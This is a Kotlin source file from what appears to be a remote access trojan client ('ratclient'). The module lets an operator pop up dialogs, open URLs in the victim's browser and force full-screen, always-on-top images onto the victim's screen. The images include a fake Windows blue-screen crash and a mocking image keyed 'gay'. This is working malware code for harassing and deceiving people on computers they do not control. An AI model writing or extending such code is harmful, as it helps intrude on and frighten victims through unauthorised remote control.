package net.x123dev.ratclient.modules

import net.x123dev.ratclient.ScalablePane
import java.awt.Desktop
import java.awt.FlowLayout
import java.awt.GridBagConstraints
import java.awt.GridBagLayout
import java.lang.Exception
import java.net.URI
import java.net.URL
import javax.imageio.ImageIO
import javax.swing.*

fun displayInfoDialog(msg:String){
    try{
        infoThread(msg).start()
    }catch(e:Exception){
        e.printStackTrace()
    }
}

fun browseWebsite(url:String){
    try{
        Desktop.getDesktop().browse(URI.create(url))
    }catch(e:Exception){
        e.printStackTrace()
    }
}

fun fullScreenImage(title:String){

    fullScreenImageFromURL(when(title){
        "crash"->"https://www.itmagazine.ch/imgserver/artikel/Illustrationen/2020/mid/Bsodwindows10.png_200824_100851.jpg"
        "leobad"->"https://i.imgur.com/3FgicVg.png"
        "gay"->"https://pbs.twimg.com/media/B4vhLhBIgAAFjj0.jpg"
        "clown"-> "https://st2.depositphotos.com/1194063/6307/i/950/depositphotos_63079503-stock-photo-clown.jpg"
        "kekw"->"https://uploads-ssl.webflow.com/604d8aa059681eb15035fd3e/63644ab1a48040d9f35be665_KEKW%20Emote%20Origin%20and%20history.png"
        else->"https://uploads-ssl.webflow.com/604d8aa059681eb15035fd3e/63644ab1a48040d9f35be665_KEKW%20Emote%20Origin%20and%20history.png"
    })
}

fun fullScreenImageFromURL(title:String){
    try{
        imageThread(title).start()
    }catch(e:Exception){
        e.printStackTrace()
    }
}

class infoThread(var msg:String) : Thread(){
    override fun run(){
        println("messagethread started: $msg")
        JOptionPane.showMessageDialog(null,msg)
    }
}

class imageThread(var title:String) : Thread(){
    override fun run(){
        println("imagethread started: $title")
        var frame = JFrame()
        frame.extendedState=JFrame.MAXIMIZED_BOTH
        frame.isUndecorated=true
        frame.add(ScalablePane(ImageIO.read(URL(title))))
        frame.defaultCloseOperation = JFrame.DISPOSE_ON_CLOSE
        frame.isAlwaysOnTop = true
        frame.isVisible=true
    }
}